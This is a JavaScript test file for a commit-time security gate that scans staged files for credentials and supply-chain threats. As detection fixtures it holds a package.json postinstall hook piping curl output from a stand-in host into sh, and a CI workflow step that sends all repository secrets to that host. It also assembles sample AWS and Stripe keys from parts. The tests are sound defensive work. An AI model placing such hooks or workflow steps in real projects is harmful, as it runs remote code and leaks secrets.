// `lazaret hook`: the commit-time gate (hook.js; the Python package's python/tests/scanner/test_hook.py, whose
// cases these are, with H-2's review's). The files being committed are scanned as a project scan with --deps would
// scan them, from their staged content, and the commit fails on --ci's security and supply-chain conditions. Each
// test makes a git repository in a temporary folder; the credentials are built from parts, so this file holds none,
// and nothing is run but git (and, in two tests, a stand-in for it that runs git).

import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import {
  chmodSync, mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync, existsSync,
} from "node:fs";
import { devNull, tmpdir } from "node:os";
import { delimiter, dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { run } from "../src/index.js";
import { check, parseHookArgs, repoRoot, shown } from "../src/hook.js";
import { fileNames, findProgram, folders } from "../src/lib/programs.js";

const BIN = fileURLToPath(new URL("../bin/lazaret.js", import.meta.url));
const GIT = findProgram("git");
const WINDOWS = process.platform === "win32";
const SKIP_GIT = GIT ? false : "git is not installed";
const AWS_KEY = "AKIA" + "Q3EGRSWJ" + "ZTB7XF2N";
const HOOK_DOWNLOADS = '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "curl -s https://x.invalid/i | sh"}}\n';
const WORKFLOW = "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
  + "      - run: echo \"${{ toJSON(secrets) }}\" | curl -d @- https://x.invalid/c\n";
const COLLISION = "its name is another file's on this system (they differ only in case, in their Unicode form or by a "
  + "backslash), so it could not be copied for the scan";
const UNPRINTED = "git could not print it from the index";
// git without the machine's or the user's settings (a global commit.gpgsign would stop a test's commit)
const ENV = { ...process.env, GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: devNull };

function repo() {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), "lz-hook-")));
  const git = (...args) => {
    const p = spawnSync(GIT, ["-C", dir, ...args], { env: ENV });
    if (p.status !== 0) throw new Error(`git ${args.join(" ")}: ${p.stderr}`);
    return p.stdout.toString("utf8");
  };
  const gitIn = (input, ...args) => {
    const p = spawnSync(GIT, ["-C", dir, ...args], { env: ENV, input });
    if (p.status !== 0) throw new Error(`git ${args.join(" ")}: ${p.stderr}`);
    return p.stdout.toString("utf8").trim();
  };
  git("init", "-q");
  git("config", "user.email", "t@x.invalid");
  git("config", "user.name", "t");
  git("config", "core.autocrlf", "false");
  const write = (rel, text) => {
    const path = join(dir, ...rel.split("/"));
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, text);
  };
  const stage = (rel, text) => {
    write(rel, text);
    git("--literal-pathspecs", "add", "-f", "--", rel);
  };
  const lines = [];
  const hook = async (files = [], { cwd = dir, env = ENV } = {}) => {
    lines.length = 0;
    const code = await check(files, { cwd, env, out: (s) => lines.push(s) });
    return { code, out: lines.join("\n") + "\n" };
  };
  const done = () => rmSync(dir, { recursive: true, force: true, maxRetries: 3 });
  return { dir, git, gitIn, write, stage, hook, done };
}

/** A test with a repository, removed after it. */
function repoTest(name, fn, opts = {}) {
  test(name, { skip: SKIP_GIT, ...opts }, async () => {
    const r = repo();
    try { await fn(r); } finally { r.done(); }
  });
}

repoTest("a staged credential fails the commit", async (r) => {
  r.stage("settings.py", `AWS_ACCESS_KEY_ID = '${AWS_KEY}'\n`);
  r.stage("util.py", "def add(a, b):\n    return a + b\n");
  const { code, out } = await r.hook();
  assert.equal(code, 1, out);
  assert.match(out, /^lazaret hook: 2 files checked\n/);
  assert.ok(out.includes("  settings.py\n    L1     BLOCKER  [S-TOKEN] "), out);
  assert.ok(out.includes("  Commit gate:  FAILED \n    ✗ No blocker issues\n"), out);
  assert.ok(!out.includes(AWS_KEY));                                   // redacted, as in a project scan
  assert.ok(out.includes("» [redacted]"));
  assert.ok(!out.includes("Duplication"));
});

repoTest("the staged content, not the file on disk", async (r) => {
  r.stage("settings.py", `KEY = '${AWS_KEY}'\n`);
  r.write("settings.py", "KEY = None\n");                              // cleaned on disk, not staged
  assert.equal((await r.hook()).code, 1);
  r.stage("settings.py", "KEY = None\n");
  r.write("settings.py", `KEY = '${AWS_KEY}'\n`);                       // on disk only
  assert.equal((await r.hook()).code, 0);
  assert.equal((await r.hook(["settings.py"])).code, 0);               // a named file that git tracks: its staged content
});

repoTest("after the first commit and a rename", async (r) => {
  r.stage("a.py", "x = 1\n");
  r.git("commit", "-q", "-m", "a");
  let { code, out } = await r.hook();
  assert.deepEqual([code, out.trim()], [0, "lazaret hook: nothing to check"]);
  r.git("mv", "a.py", "b.py");
  r.stage("b.py", `x = '${AWS_KEY}'\n`);
  ({ code, out } = await r.hook());
  assert.equal(code, 1, out);
  assert.ok(out.includes("  b.py\n"), out);
});

repoTest("supply-chain threats a worm commits", async (r) => {
  r.stage("package.json", HOOK_DOWNLOADS);
  r.stage(".github/workflows/ci.yml", WORKFLOW);
  const { code, out } = await r.hook();
  assert.equal(code, 1, out);
  assert.ok(out.includes("[SC-INSTALL-HOOK]"), out);
  assert.ok(out.includes("[SC-WORKFLOW-SECRETS]"), out);
  assert.ok(out.includes("✗ No supply-chain indicators"), out);
});

repoTest("a config file and a path with spaces", async (r) => {
  r.stage("deploy keys/prod ü.env", "STRIPE_KEY=sk_live_" + "4eC39HqLyjWDarjtT1zdp7dc" + "\n");
  const { code, out } = await r.hook();
  assert.equal(code, 1, out);
  assert.ok(out.includes("  deploy keys/prod ü.env\n"), out);
});

repoTest("quality is not the gate", async (r) => {
  const body = Array.from({ length: 60 }, (_, i) => `    v${i} = a + ${i}\n    a = v${i} * 2\n`).join("");
  r.stage("big.py", "def f(a):\n" + body + "    return a\n" + "def g(a):\n" + body + "    return a\n");
  r.stage("README.md", "# x\n");
  const { code, out } = await r.hook();
  assert.equal(code, 0, out);
  assert.equal(out, "lazaret hook: 2 files checked\n  Commit gate:  PASSED \n");
});

repoTest("named files: untracked ones read from disk, relative to where it runs", async (r) => {
  r.write("new.py", `KEY = '${AWS_KEY}'\n`);
  assert.equal((await r.hook(["new.py"])).code, 1);
  r.write("sub/x.py", "x = 1\n");
  assert.equal((await r.hook(["x.py"], { cwd: join(r.dir, "sub") })).code, 0);
});

repoTest("links are not followed, and what can't be read fails", async (r) => {
  const outside = mkdtempSync(join(tmpdir(), "lz-hook-out-"));
  try {
    writeFileSync(join(outside, "secret.py"), `KEY = '${AWS_KEY}'\n`);
    symlinkSync(join(outside, "secret.py"), join(r.dir, "link.py"));
    r.git("add", "link.py");
    assert.equal((await r.hook()).code, 0);
    assert.equal((await r.hook(["link.py"])).code, 0);                 // named (as pre-commit may): still not followed
    const fifo = spawnSync("mkfifo", [join(r.dir, "pipe.py")]);
    assert.equal(fifo.status, 0);
    const { code, out } = await r.hook(["pipe.py"]);
    assert.equal(code, 1, out);
    assert.ok(out.includes("  pipe.py\n    L1     CRITICAL [SC-TRUNCATED] File not fully scanned: it is not a regular file."), out);
  } finally {
    rmSync(outside, { recursive: true, force: true });
  }
}, { skip: SKIP_GIT || (WINDOWS && "no symbolic links or FIFOs to make here") });

repoTest("usage errors", async (r) => {
  mkdirSync(join(r.dir, "folder"));
  for (const [files, message] of [[["folder"], "is a folder"], [["gone.py"], "does not exist"],
    [[join("..", "x.py")], "is outside the repository"]]) {
    await assert.rejects(r.hook(files), (e) => e.name === "Error" && e.message.includes(message), message);
  }
  const outside = realpathSync(mkdtempSync(join(tmpdir(), "lz-hook-norepo-")));
  try {
    if (repoRoot(outside, ENV) === null) {                             // (a temporary folder inside a repository: skip)
      await assert.rejects(r.hook([], { cwd: outside }), /not in a git repository: name the files to check/);
      writeFileSync(join(outside, "a.py"), `KEY = '${AWS_KEY}'\n`);
      assert.equal((await r.hook(["a.py"], { cwd: outside })).code, 1);
    }
  } finally {
    rmSync(outside, { recursive: true, force: true });
  }
});

repoTest("the command line", async (r) => {
  r.stage("settings.py", `KEY = '${AWS_KEY}'\n`);
  const cli = (...argv) => spawnSync(process.execPath, [BIN, ...argv], { cwd: r.dir, env: ENV, encoding: "utf8", timeout: 40000 });
  let p = cli("hook");
  assert.equal(p.status, 1, p.stdout + p.stderr);
  assert.ok(p.stdout.includes("[S-TOKEN]"), p.stdout);
  p = cli("hook", "--staged", "-q");
  assert.equal(p.status, 1, p.stderr);
  p = cli("hook", "--staged", "settings.py");
  assert.equal(p.status, 2);
  assert.match(p.stderr, /--staged checks the staged files/);
  p = cli("hook", "--nope");
  assert.equal(p.status, 2);
  assert.match(p.stderr, /^error: unrecognized arguments: --nope\n/);
  p = cli("hook", "--help");
  assert.equal(p.status, 0);
  assert.match(p.stdout, /lazaret hook \[FILE …\]/);
  p = cli("hook", "gone.py");
  assert.equal(p.status, 2);
  assert.equal(p.stderr, "error: gone.py does not exist\n");
  p = cli("hook", "--qu", "--sta");                                     // (abbreviations, as argparse takes them)
  assert.equal(p.status, 1);
  assert.equal(p.stdout, "lazaret hook: 1 file checked\n  settings.py\n"
    + "    L1     BLOCKER  [S-TOKEN] String matches a known secret format (AWS/GitHub/Slack/Stripe/Google key, private key, or JWT).\n"
    + "  Commit gate:  FAILED \n    ✗ No blocker issues\n    ✗ No critical vulnerabilities\n");
});

repoTest("files in a dependency folder are read", async (r) => {
  // (the project scan leaves node_modules, a virtualenv and a vendor folder out unless --deps, so a key committed in
  // one went unchecked: H-2's review). They are read as a dependency's files are.
  r.stage("node_modules/x/settings.py", `KEY = '${AWS_KEY}'\n`);
  r.stage("vendor/package.json", '{"name": "y"}\n');
  r.stage("vendor/y/settings.py", `KEY = '${AWS_KEY}'\n`);
  const { code, out } = await r.hook();
  assert.equal(code, 1, out);
  assert.match(out, /^lazaret hook: 3 files checked\n/);
  for (const rel of ["node_modules/x/settings.py", "vendor/y/settings.py"]) {
    assert.ok(out.includes(`  ${rel}\n    L1     BLOCKER  [S-TOKEN]`), out);
  }
  assert.equal((await r.hook(["vendor/y/settings.py"])).code, 1);    // (named, as pre-commit names them)
});

repoTest("two names, one file in the check", async (r) => {
  // A backslash ends a folder's name in the temporary tree, as on Windows: `a\b.py` was written over `a/b.py`, whose
  // key then went unread (H-2's review). The second is SC-TRUNCATED now, and the first is read.
  r.stage("a/b.py", `KEY = '${AWS_KEY}'\n`);
  r.stage("a\\b.py", "KEY = None\n");
  const { code, out } = await r.hook();
  assert.equal(code, 1, out);
  assert.ok(out.includes("  a/b.py\n    L1     BLOCKER  [S-TOKEN]"), out);
  assert.ok(out.includes(`  a\\b.py\n    L1     CRITICAL [SC-TRUNCATED] File not fully scanned: ${COLLISION}.`), out);
}, { skip: SKIP_GIT || (WINDOWS && "a file name can't hold a backslash here") });

repoTest("names that differ only in case", async (r) => {
  // On macOS and Windows `A.py` and `a.py` are one file: the second was written over the first. Put in the index as
  // git would hold them from another system (the work tree can't hold both there either).
  r.git("config", "core.ignorecase", "false");
  for (const [rel, text] of [["A.py", `KEY = '${AWS_KEY}'\n`], ["a.py", "KEY = None\n"]]) {
    r.git("update-index", "--add", "--cacheinfo", `100644,${r.gitIn(text, "hash-object", "-w", "--stdin")},${rel}`);
  }
  const { code, out } = await r.hook();
  assert.equal(code, 1, out);
  assert.ok(out.includes("  A.py\n    L1     BLOCKER  [S-TOKEN]"), out);
  const probe = mkdtempSync(join(tmpdir(), "lz-hook-case-"));
  try {
    writeFileSync(join(probe, "X"), "");
    if (existsSync(join(probe, "x"))) assert.ok(out.includes(COLLISION), out);   // (a system whose names ignore case)
  } finally {
    rmSync(probe, { recursive: true, force: true });
  }
});

repoTest("an index entry that is not a blob", async (r) => {
  // git prints a tree's bytes after its line: they are skipped, not read as the next file's line.
  r.stage("d/a.py", "x = 1\n");
  const tree = r.git("write-tree").trim();
  r.git("update-index", "--add", "--cacheinfo", `100644,${r.git("rev-parse", `${tree}:d`).trim()},x.py`);
  r.stage("y.py", `KEY = '${AWS_KEY}'\n`);
  const { code, out } = await r.hook();
  assert.equal(code, 1, out);
  assert.ok(out.includes(`  x.py\n    L1     CRITICAL [SC-TRUNCATED] File not fully scanned: ${UNPRINTED}.`), out);
  assert.ok(out.includes("  y.py\n    L1     BLOCKER  [S-TOKEN]"), out);
});

/** A folder holding a stand-in `git` (a shell script) for PATH. */
function standIn(script) {
  const bindir = mkdtempSync(join(tmpdir(), "lz-hook-bin-"));
  writeFileSync(join(bindir, "git"), script);
  chmodSync(join(bindir, "git"), 0o755);
  return bindir;
}

repoTest("git stopping early leaves no file unchecked", async (r) => {
  // A git that prints the first blob and stops: each file after it is SC-TRUNCATED (in the Python package, the ones
  // after the first it failed on were neither written nor reported: H-2's review).
  for (const name of ["a.py", "b.py", "c.py"]) r.stage(name, "x = 1\n");
  const bindir = standIn(`#!/bin/sh\ncase " $* " in\n  *" cat-file "*) head -n 1 | "${GIT}" "$@"; exit 0 ;;\nesac\nexec "${GIT}" "$@"\n`);
  try {
    const { code, out } = await r.hook([], { env: { ...ENV, PATH: bindir + delimiter + process.env.PATH } });
    assert.equal(code, 1, out);
    assert.ok(!out.includes("  a.py"), out);
    for (const name of ["b.py", "c.py"]) {
      assert.ok(out.includes(`  ${name}\n    L1     CRITICAL [SC-TRUNCATED] File not fully scanned: ${UNPRINTED}.`), out);
    }
  } finally {
    rmSync(bindir, { recursive: true, force: true });
  }
}, { skip: SKIP_GIT || (WINDOWS && "the stand-in git is a shell script") });

repoTest("the git the hook runs is never the repository's own", async (r) => {
  // A repository's own `git` (git.exe on Windows, where a bare name is looked for in the working folder first) and a
  // PATH whose first entry is relative or empty (the current folder, to a shell): the git PATH names by an absolute
  // path is run (lib/programs.js; the Python package's GO-8).
  r.stage("settings.py", `KEY = '${AWS_KEY}'\n`);
  const marker = join(r.dir, "ran");
  writeFileSync(join(r.dir, "git"), `#!/bin/sh\necho x > "${marker}"\n`);
  chmodSync(join(r.dir, "git"), 0o755);
  const { code, out } = await r.hook([], { env: { ...ENV, PATH: ["", ".", dirname(GIT)].join(delimiter) } });
  assert.equal(code, 1, out);
  assert.ok(out.includes("[S-TOKEN]"), out);
  assert.equal(existsSync(marker), false);
}, { skip: SKIP_GIT || (WINDOWS && "the repository's git is a shell script") });

repoTest("no git: what could not be read fails the commit", async (r) => {
  r.stage("a.py", "x = 1\n");
  await assert.rejects(r.hook([], { env: { ...ENV, PATH: "" } }), /not in a git repository: name the files to check/);
  const { code, out } = await r.hook(["a.py"], { env: { ...ENV, PATH: "" } });
  assert.equal(code, 0, out);                                          // (outside a repository: read from disk)
});

test("what the gate shows: vulnerabilities of MAJOR and above, supply-chain indicators, cross-file flows", () => {
  assert.equal(shown({ rule: "SC-INSTALL-HOOK", sev: "MAJOR", type: "VULN" }), true);
  assert.equal(shown({ rule: "SC-INSTALL-HOOK", sev: "INFO", type: "VULN" }), false);
  assert.equal(shown({ rule: "X-CMD", sev: "MINOR", type: "VULN" }), true);
  assert.equal(shown({ rule: "S-TOKEN", sev: "BLOCKER", type: "VULN" }), true);
  assert.equal(shown({ rule: "P-EVAL", sev: "MAJOR", type: "VULN" }), true);
  assert.equal(shown({ rule: "P-X", sev: "MINOR", type: "VULN" }), false);
  assert.equal(shown({ rule: "Q-LONG", sev: "BLOCKER", type: "BUG" }), false);
});

test("the hook's options, as argparse reads them", () => {
  assert.deepEqual(parseHookArgs(["a.py", "-q", "--", "-b.py"]), { opts: { quiet: true }, files: ["a.py", "-b.py"] });
  assert.deepEqual(parseHookArgs(["--sta", "--qui"]), { opts: { staged: true, quiet: true }, files: [] });
  assert.deepEqual(parseHookArgs(["-qh", "-"]), { opts: { quiet: true, help: true }, files: ["-"] });
  assert.throws(() => parseHookArgs(["--staged=1"]), /argument --staged: ignored explicit argument '1'/);
  assert.throws(() => parseHookArgs(["-x"]), /unrecognized arguments: -x/);
  assert.throws(() => parseHookArgs(["--ci"]), /unrecognized arguments: --ci/);
});

test("lazaret hook is the commit-time gate unless a path named hook is here", async () => {
  const cwd = process.cwd();
  const d = mkdtempSync(join(tmpdir(), "lz-hook-dispatch-"));
  try {
    process.chdir(d);
    const err = [];
    const code = await run(["hook", "--nope"], { err: (s) => err.push(s), out: () => {} });
    assert.equal(code, 2);
    assert.equal(err[0], "error: unrecognized arguments: --nope");
    mkdirSync("hook");
    writeFileSync("a.py", "x = 1\n");
    const out = [];
    const scan = run(["hook", "--no-json", "--no-html"], { out: (s) => out.push(s), err: () => {} });
    assert.equal(scan, 2);                                             // the folder named hook: nothing in it to scan
  } finally {
    process.chdir(cwd);
    rmSync(d, { recursive: true, force: true });
  }
});

test("programs: PATH's absolute folders, once each, never the current folder", () => {
  assert.deepEqual(folders("/usr/bin::.:bin:/usr/bin/:/bin", { windows: false }), ["/usr/bin", "/bin"]);
  assert.deepEqual(folders('C:\\Git\\cmd; "C:\\Tools" ;.;C:x;\\x;\\\\srv\\share\\bin;c:\\git\\CMD\\', { windows: true }),
    ["C:\\Git\\cmd", "C:\\Tools", "\\\\srv\\share\\bin"]);
  assert.deepEqual(fileNames("git", { windows: true, pathext: ".COM;.EXE" }), ["git.COM", "git.EXE"]);
  assert.deepEqual(fileNames("git.exe", { windows: true }), ["git.exe"]);
  assert.deepEqual(fileNames("git", { windows: false }), ["git"]);
  assert.equal(findProgram("./git"), null);
  assert.equal(findProgram("C:git", { windows: true, env: {} }), null);
  assert.equal(findProgram("git", { env: { PATH: "" } }), null);
  if (GIT && !WINDOWS) {
    assert.equal(findProgram("git", { env: { PATH: `.:${dirname(GIT)}` } }), join(dirname(GIT), "git"));
  }
});
